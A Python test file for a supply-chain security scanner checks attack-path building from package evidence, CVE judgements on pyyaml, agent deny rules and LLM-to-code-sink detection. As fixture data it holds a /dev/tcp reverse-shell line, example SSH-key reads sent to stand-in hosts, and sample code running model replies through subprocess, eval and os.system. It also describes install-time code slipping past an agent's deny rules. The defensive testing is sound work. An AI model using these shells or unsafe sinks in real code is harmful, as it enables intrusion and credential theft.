"""Offline tests for attack paths (run: python3 tests/test_attack_path.py).

Three scenarios (tests/fixtures/attack_path) are the answer key: S1 CVE condition holds, S2 it does not, S3 an unknown
install-time payload. Profiles use a fake home."""
import json
import os
import shutil
import sys
import tempfile
from pathlib import Path

IMPL = Path(__file__).resolve().parents[1] / "guard"
sys.path.insert(0, str(IMPL))
import attack_path as AP  # noqa: E402
import env_profile  # noqa: E402
from adapters import claude_code  # noqa: E402

TPL = IMPL.parent / "tests" / "fixtures" / "attack_path"


def setup(s: str, t: Path):
    proj, home = t / s, t / f"home_{s}"
    shutil.copytree(TPL / s, proj)
    rec = json.loads((proj / ".aasm/inputs/guard_record.json").read_text())
    for p in rec["packages"]:                     # what the current guard writes for a hook with no dangerous call
        for e in p["evidence"]:
            if e["rule"] == "install_hook" and p["package"] == "pyyaml":
                e["note"], e["label"] = "no dangerous call", "install hook (no dangerous call)"
    (home / ".ssh").mkdir(parents=True)
    (home / ".ssh/id_ed25519").write_text("x"); (home / ".ssh/id_ed25519").chmod(0o600)
    (proj / ".env").write_text("OPENAI_API_KEY=x\n")
    if s == "S3":                                  # the scenario's narrow agent permissions, as Claude Code settings
        (proj / ".claude").mkdir()
        (proj / ".claude/settings.json").write_text(json.dumps({"permissions": {
            "allow": ["Bash(pytest:*)", "Bash(pip install:*)"], "deny": ["Read(./.env)", "Read(~/.ssh/**)"]}}))
    if (proj / "mcp_config.json").exists():
        shutil.copy(proj / "mcp_config.json", proj / ".mcp.json")
    prof = env_profile.collect(proj, claude_code, home=home, env={"HOME": str(home)})
    return proj, rec, prof


def pairs(result, conf=None):
    return {(p["package"].split()[0], p["asset"].split(" ")[0]) for p in result["paths"]
            if (conf is None or p["confidence"] == conf) and p["target_kind"] == "asset"}     # our-side capabilities: own tests


with tempfile.TemporaryDirectory() as td:
    t = Path(td)
    # S1: yaml.full_load on an uploaded file
    proj, rec, prof = setup("S1", t)
    r = AP.build(rec, prof)
    assert r["pending_judgements"] and r["pending_judgements"][0]["sites"][0]["call"] == "yaml.full_load", r["pending_judgements"]
    assert pairs(r) == {("pyyaml", "./.env"), ("pyyaml", "~/.ssh/id_ed25519")} and not pairs(r, AP.CONFIRMED)   # waits for judgement
    osv = proj / ".aasm/osv"; osv.mkdir(parents=True)
    shutil.copy(proj / ".aasm/inputs/osv_GHSA-8q59-q68h-6hv4.json", osv / "GHSA-8q59-q68h-6hv4.json")
    jdir = proj / ".aasm-ai"; jdir.mkdir()
    good = {"judgements": [{"package": "pyyaml", "vuln": "GHSA-8q59-q68h-6hv4", "holds": True, "site": "app.py:9", "call": "yaml.full_load",
                            "condition": "untrusted YAML processed with full_load",
                            "evidence": [{"file": ".aasm/osv/GHSA-8q59-q68h-6hv4.json", "quote": "through the full_load method or with the FullLoader loader"},
                                         {"file": "app.py", "quote": 'yaml.full_load(request.files["settings"].read())'}]}]}
    (jdir / "cve_judgments.json").write_text(json.dumps(good))
    j, errs = AP.load_judgements(proj)
    assert not errs, errs
    r = AP.build(rec, prof, j)
    assert pairs(r, AP.CONFIRMED) == {("pyyaml", "./.env"), ("pyyaml", "~/.ssh/id_ed25519")} and not r["pending_judgements"]
    assert any("app.py:9" in n["label"] for n in r["nodes"] if n["kind"] == "code")
    assert r["paths"][0]["asset_tier"] == 1                                            # tier-1 asset first
    assert next(p for p in r["paths"] if p["asset"].startswith("~/.ssh"))["impact"] == ["remote server login, git push"]
    # a judgement whose quote is not in the file, or that quotes an installed package, is refused
    bad = json.loads(json.dumps(good)); bad["judgements"][0]["evidence"][1]["quote"] = "yaml.full_load(trusted_only)"
    (jdir / "cve_judgments.json").write_text(json.dumps(bad))
    j, errs = AP.load_judgements(proj)
    assert not j and "not found verbatim" in errs[0]
    (proj / ".venv/lib").mkdir(parents=True); (proj / ".venv/lib/yaml.py").write_text("SAFE = 'this package is safe'")
    bad["judgements"][0]["evidence"][1] = {"file": ".venv/lib/yaml.py", "quote": "this package is safe"}
    (jdir / "cve_judgments.json").write_text(json.dumps(bad))
    j, errs = AP.load_judgements(proj)
    assert not j and "not trusted text" in errs[0]
    bad["judgements"][0]["evidence"][1] = {"file": ".aasm/inputs/guard_record.json", "quote": "Improper Input Validation"}
    (jdir / "cve_judgments.json").write_text(json.dumps(bad))
    assert "not trusted text" in AP.load_judgements(proj)[1][0]

    # S2: SafeLoader on a repo file -> judged false -> no path, listed with the reason
    proj, rec, prof = setup("S2", t)
    (proj / ".aasm/osv").mkdir(parents=True)
    shutil.copy(proj / ".aasm/inputs/osv_GHSA-8q59-q68h-6hv4.json", proj / ".aasm/osv/GHSA-8q59-q68h-6hv4.json")
    (proj / ".aasm-ai").mkdir()
    (proj / ".aasm-ai/cve_judgments.json").write_text(json.dumps({"judgements": [{
        "package": "pyyaml", "vuln": "GHSA-8q59-q68h-6hv4", "holds": False, "condition_not_met": "reads only a file in the repo with SafeLoader",
        "evidence": [{"file": "app.py", "quote": "yaml.load(f, Loader=yaml.SafeLoader)"}]}]}))
    r = AP.run(proj, prof, rec)
    assert not r["paths"] and r["not_reachable"][0]["by"].startswith("AI") and not r["judgement_errors"]
    assert any(c["loader"] == "yaml.SafeLoader" for c in prof["project_code"]["risky_calls"])
    # without any judgement, a package the code never imports is ruled out by the rule alone
    prof2 = json.loads(json.dumps(prof)); prof2["project_code"]["imports"] = {}; prof2["project_code"]["risky_calls"] = []
    r = AP.build(rec, prof2)
    assert not r["paths"] and r["not_reachable"][0]["by"] == "rule"

    # S3: download-and-exec install hook; the agent's deny rules do not cover install-time code
    proj, rec, prof = setup("S3", t)
    r = AP.build(rec, prof)
    assert pairs(r) == {("helper-utils", "./.env"), ("helper-utils", "~/.ssh/id_ed25519"), ("helper-utils", "MCP")}, pairs(r)
    assert all(p["confidence"] == AP.POSSIBLE for p in r["paths"])                    # unknown payload: always possible
    env_path = next(p for p in r["paths"] if p["asset"].startswith("./.env"))
    assert any("Read(./.env)" in e["evidence"] for e in env_path["edges"])           # deny rule shown as not applying
    assert r["bottlenecks"] and r["bottlenecks"][0]["paths"] == len(r["paths"])
    assert not any(n["label"].startswith("app env var") for n in r["nodes"])          # install-time code: no app env vars
    rec2 = json.loads(json.dumps(rec))                 # a second signal for the same capability adds no paths
    rec2["packages"][0]["evidence"].append({"rule": "download_then_execute", "label": "download then execute", "location": "setup.py:14"})
    assert len(AP.build(rec2, prof)["paths"]) == len(r["paths"])
    text = AP.report_text(r)
    n = len(r["paths"])
    assert f"[AegisPilot attack path] {n} path(s) (confirmed 0, possible {n})" in text and "choke point" in text and "do not change the allow / block verdict" in text
    assert any(p["target_kind"] == "ours" and p["asset"].startswith("code under development") for p in r["paths"])   # our side too

    # paths from what the code does (package_caps): a named credential file / agent config / MCP token -> confirmed
    caps_rec = json.loads(json.dumps(rec))
    caps_rec["packages"][0]["evidence"] = [{"rule": "keyword", "label": "dangerous keyword", "location": "x.py:1"}]
    caps_rec["packages"][0]["capabilities"] = {"items": [
        {"kind": "file_read", "target": "~/.ssh/id_ed25519", "when": "import", "at": "pkg/__init__.py:3", "categories": ["credential_path"]},
        {"kind": "network_connect", "target": "https://collector.example/x", "when": "import", "at": "pkg/__init__.py:4", "categories": []}]}
    r = AP.build(caps_rec, prof)
    direct = [p for p in r["paths"] if p["edges"][-1]["confidence"] == AP.CONFIRMED and p["edges"][-1]["evidence"].startswith("the code ")]
    assert [p["asset"].split(" ")[0] for p in direct] == ["~/.ssh/id_ed25519"], [p["asset"] for p in r["paths"]]
    assert not any(p["asset"].startswith("./.env") for p in r["paths"])          # a file read names one file, not all
    assert any("collector.example" in e["evidence"] for p in r["paths"] for e in p["edges"])     # where it can send it
    caps_rec["packages"][0]["capabilities"]["items"] = [
        {"kind": "file_write", "target": "~/.claude/settings.json", "when": "install", "at": "setup.py:9", "categories": []}]
    prof_cfg = json.loads(json.dumps(prof))
    prof_cfg["capabilities"] = [{"id": "ours:agent_config", "kind": "agent_config", "label": "agent settings, hooks and skills",
                                 "gives": "tamper with agent settings and hooks", "tier": 1, "reached_by": ["agent", "file_write", "process"],
                                 "paths": ["~/.claude/settings.json"]}]
    r = AP.build(caps_rec, prof_cfg)
    assert [(p["asset"], p["confidence"]) for p in r["paths"]] == [("agent settings, hooks and skills", AP.CONFIRMED)], r["paths"]

    # the request card never carries package text
    t2 = t / "card"; t2.mkdir()
    proj, rec, prof = setup("S1", t2)
    r = AP.build(rec, prof)
    osv_files = AP.save_osv(proj, r["pending_judgements"][0]["vuln_ids"],
                            fetch=lambda vid: (TPL / "S1/.aasm/inputs/osv_GHSA-8q59-q68h-6hv4.json").read_bytes())
    card = AP.cve_judgement_request(proj, r["pending_judgements"], osv_files)
    assert ".aasm/osv/GHSA-8q59-q68h-6hv4.json" in card and "app.py:9 yaml.full_load" in card
    assert "def run(self)" not in card and "__import__" not in card                   # guard-record snippets stay out

# model output reaching a code sink in the project's own code
import project_code  # noqa: E402
with tempfile.TemporaryDirectory() as td:
    p = Path(td)
    (p / "agent.py").write_text("""import anthropic, subprocess, json, yaml, os
from langchain_openai import ChatOpenAI
from claude_agent_sdk import query
import openai as oa
client = anthropic.Anthropic()
llm = ChatOpenAI()
def act(task):
    msg = client.messages.create(model="m", max_tokens=100, messages=[{"role": "user", "content": task}])
    return subprocess.run(msg.content[0].text, shell=True)
def chain(q):
    out = llm.invoke(q)
    return eval(out.content)
async def sdk(q):
    async for m in query(prompt=q):
        os.system(str(m))
def via_alias(q):
    r = oa.OpenAI().chat.completions.create(model="m", messages=[])
    return yaml.load(r.choices[0].message.content, Loader=yaml.SafeLoader)
def separate(q):
    client.messages.create(model="m", max_tokens=1, messages=[])
def other():
    exec("print(1)")
""")
    pc = project_code.scan(p)
    cands = {(c["symbol"], c["sink_call"]) for c in pc["llm_sink_candidates"]}
    assert cands == {("act", "subprocess.run"), ("chain", "eval"), ("sdk", "os.system")}, cands   # SafeLoader / other function: no
    prof = {"principals": [{"id": "principal:os_user:u", "kind": "os_user", "user": "u"}],
            "assets": [{"id": "asset:~/.ssh/id_ed25519", "path": "~/.ssh/id_ed25519", "kind": "ssh_private_key", "readable_by_os_user": True}],
            "project_code": pc}
    r = AP.build({"packages": []}, prof)
    assert len(r["paths"]) == 3 and all(x["confidence"] == AP.POSSIBLE for x in r["paths"]) and len(r["pending_judgements"]) == 3
    card = AP.cve_judgement_request(p, r["pending_judgements"], {})
    assert "LLM reply → dangerous function" in card and "agent.py:9" in card and "advisory text" not in card
    (p / ".aasm-ai").mkdir()
    (p / ".aasm-ai/cve_judgments.json").write_text(json.dumps({"judgements": [
        {"kind": "llm_sink", "sink": "agent.py:9", "llm_call": "agent.py:8", "holds": True, "condition": "runs the reply text as a shell command",
         "evidence": [{"file": "agent.py", "quote": "subprocess.run(msg.content[0].text, shell=True)"}]},
        {"kind": "llm_sink", "sink": "agent.py:12", "llm_call": "agent.py:11", "holds": False, "condition_not_met": "assumed",
         "evidence": [{"file": "agent.py", "quote": "return eval(out.content)"}]},
        {"kind": "llm_sink", "sink": "agent.py:15", "holds": True, "evidence": [{"file": "agent.py", "quote": "os.system(m.content)"}]}]}))
    j, errs = AP.load_judgements(p)
    assert len(j) == 2 and len(errs) == 1 and "not found verbatim" in errs[0]                       # a misquote is refused
    r = AP.build({"packages": []}, prof, j)
    conf = [x for x in r["paths"] if x["confidence"] == AP.CONFIRMED]
    assert len(conf) == 1 and "agent.py:8" in conf[0]["package"] and r["not_reachable"][0]["vuln"] == "prompt injection"
    assert len(r["pending_judgements"]) == 1 and r["pending_judgements"][0]["sink"] == "agent.py:15"

# where a record came from decides when its code runs and how the path is cut (capabilities.json "sources")
with tempfile.TemporaryDirectory() as t:
    proj, _, prof = setup("S3", Path(t))
    shell = {"rule": "reverse_shell", "label": "reverse shell", "location": "x.sh:1", "snippet": "bash -i >& /dev/tcp/10.0.0.1/4444"}

    def one(**pkg):
        rec = {"packages": [{"package": "x", "version": "1", "verdict": "BLOCK", "evidence": [dict(shell, **pkg.pop("ev", {}))], **pkg}]}
        r = AP.build(rec, prof)
        principals = [n["label"] for n in r["nodes"] if n["kind"] == "principal"]
        fixes = [b["fix"] for b in r["bottlenecks"] if b["kind"] == "capability"]
        return principals, fixes
    pr, fx = one(bundle="hook", bundle_label="hooks in settings.json")
    assert any("hook" in x for x in pr) and fx and "hook command" in fx[0], (pr, fx)
    pr, fx = one(bundle="mcp_server")
    assert any("when the agent starts the MCP server" in x for x in pr) and "not registering this MCP server" in fx[0], (pr, fx)
    pr, fx = one(direct_source="https://github.com/o/r@v1")
    assert any("when the package is used" in x for x in pr) and "git repo" in fx[0], (pr, fx)
    pr, fx = one(via="app → x", ev={"location": "package.json#postinstall.sh:1"})
    assert any("at install" in x for x in pr) and "pulls in this dependency" in fx[0], (pr, fx)
    pr, _ = one(install_time_files=["install.js"], ev={"location": "package/install.js:3"})   # `node install.js` in postinstall
    assert any("at install" in x for x in pr), pr
    pr, fx = one()
    assert any("when the package is used" in x for x in pr) and "fixed version" in fx[0], (pr, fx)
# one node per capability, each reaching only what it reaches: a confirmed read of a key is its own path, and a file
# write does not inherit the "anything" of a process run through a shared principal
with tempfile.TemporaryDirectory() as t:
    proj, _, prof = setup("S3", Path(t))
    items = [{"kind": "file_read", "target": "~/.ssh/id_ed25519", "when": "install", "at": "setup.js:2", "categories": ["credential_path"]},
             {"kind": "process_execute", "target": "setup.js", "when": "install", "at": "package.json#postinstall.sh:1", "categories": []},
             {"kind": "file_write", "target": None, "when": "install", "at": "setup.js:5", "categories": []},
             {"kind": "network_connect", "target": "https://c.example/k", "when": "install", "at": "setup.js:3", "categories": []}]
    r = AP.build({"packages": [{"package": "tool2", "version": "1", "verdict": "BLOCK", "evidence": [], "capabilities": {"items": items}}]}, prof)
    caps = [n for n in r["nodes"] if n["kind"] == "capability"]
    assert {n["capability"] for n in caps} == {"file_read", "process_execute", "file_write", "network_connect"}, caps
    conf = [x for x in r["paths"] if x["confidence"] == AP.CONFIRMED]
    assert len(conf) == 1 and conf[0]["asset"] == "~/.ssh/id_ed25519", conf
    writes = [x for x in r["paths"] if any("writes files" in r_ for r_ in [n["label"] for n in r["nodes"] if n["id"] in x["steps"]])]
    assert writes and all(x["target_kind"] not in ("ssh_private_key", "cloud_credentials") for x in writes), writes
print("attack_path: all cases passed")
